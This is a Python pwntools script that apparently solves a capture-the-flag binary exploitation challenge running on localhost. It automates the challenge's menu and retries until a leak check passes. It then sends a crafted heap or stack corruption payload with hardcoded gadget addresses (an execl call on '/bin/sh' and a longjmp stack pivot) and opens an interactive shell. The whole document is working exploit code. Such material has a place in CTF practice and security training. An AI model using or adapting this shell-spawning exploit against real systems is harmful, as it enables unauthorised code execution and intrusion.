from pwn import *
#context.log_level='debug'
t=0

def addg(p,k):
    p.recvuntil(b">\n")
    p.sendline(b"1")
    p.recvuntil(b"text\n")
    p.sendline(str(k).encode())

def rmg(p,k):
    p.recvuntil(b">")
    p.sendline(b"2")
    p.recvuntil(b"text\n")
    p.sendline(str(k).encode())

def addo(p,sz):
    p.recvuntil(b">")
    p.sendline(b"3")
    p.recvuntil(b"ocean.\n")
    p.sendline(str(sz).encode())

def pull(p,k,l):
    p.recvuntil(b">")
    p.sendline(b"4")
    p.recvuntil(b"data?\n")
    p.sendline(str(l).encode())
    p.recvuntil(b"text\n")
    p.sendline(str(k).encode())

def run(p):
    global t
    addo(p,768)
    addg(p,1)
    addg(p,2)
    addo(p,0x1000)
    pull(p,1,0x321)
    p.recvuntil(b"gate:\n")
    for i in range(50):
        p.recvline()
    s=p.recvline()
    if s!=b"00 \n":
        t+=1
        print("FAIL. Try again.",t,s.decode()[0:2])
        return 0
    pos0=0x50
    pos1=0x370
    pos2=0x610
    pld=b"a"*(pos1-pos0)
    pld+=p64(0xd7b300000000)+p64(1)
    pld=pld.ljust(pos2-pos0,b'\0')

    pld2=p64(0xd7b100000004)+p64(0x100)
    binshstr=0x45ee70
    newstack=0x480f80
    gad_execl=0x4530a7
    gad_lonjmp=0x402aef
    pld2+=p64(binshstr)+p64(0)+p64(2**64-1)+p64(newstack+0x10)+p64(newstack)+p64(gad_execl)+p64(0)+p64(gad_lonjmp)

    pld+=pld2

    pull(p,1,len(pld))
    print("Success. Press...")
    pause()
    p.send(pld)

    #gdb.attach(p)
    rmg(p,2)
    return 1

while(1):
    #p=process("./chall")
    p=remote("localhost",11451)
    if(run(p)):
        p.interactive()
        break
    else:
        p.close()